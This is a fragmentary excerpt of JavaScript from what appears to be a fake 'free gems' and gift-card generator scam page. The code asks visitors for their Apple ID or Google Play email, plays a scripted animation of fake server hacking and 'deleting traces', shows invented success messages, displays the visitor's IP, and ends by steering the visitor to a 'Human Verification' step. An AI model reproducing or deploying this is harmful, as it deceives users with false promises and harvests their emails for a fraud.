...
var R2V = "";
var R111 = " ";
var R222 = " Ebay Codes For Free ";
var R1N = " <img src='gold.png' class='status-img'>  ";
var R2N = " Giftcard ";
var PS = "";
var GN = "GEMS"; //GAME NAME
...
SEN = [" Got A 10,000 GEMS for Free ", " Received a 5,000 GEMS For Free", " Received a 40,000 GEMS For Free"];
...
function getIP() {
    ...
    if (s_IP == "xD") {
        $.get("https://api.ipify.org", function(data) {
            s_IP = data;
            SSS4 = "<strong>User IP: 159.246.16.195</strong>";
        })
    } else {
        SSS4 = "<strong>User IP:159.246.16.195";
    }
...
function ccc() {
    if ($("#username").val() == "") {
        alert("Type in your Apple ID/Google Play Email.")
        return false;
    }
    if (PS == "") {
    ...
    $(".beg").fadeOut("slow", function() {
        ...
        $(".r1r1").text(R1V + " " + R111);
        $(".r2r2").text(R2V + " " + R222);
        $(".f-username").text("Email: " + $("#username").val());
        ...
        $(".end").fadeIn("slow", function() {
            ...
            var TYPED = new Typed(".hack-generator", {
                ...
                backSpeed: 0,
                showCursor: false,
                strings: ["Connecting to <strong>" + GN + " servers...^2000", "Verifying ID " + $("#username").val() + "...^2500 <strong>VERIFIED!</strong>^1000", "Generating " + R111 + " <strong>" + R1V + "</strong>...^2000 <strong>DONE!</strong>^1000", "Preparing to generate...^2000 <strong>PREPARED!</strong>^1000", "Saving all changes...^2000", "Deleting traces...^2000", "Disconnecting with database...^2000", "<green><strong>Your GEMS Details are Ready!</green><red> <p>We just need to make sure you are a human and not a bot. Please pass our Human Verification!</strong></red>^2000"],
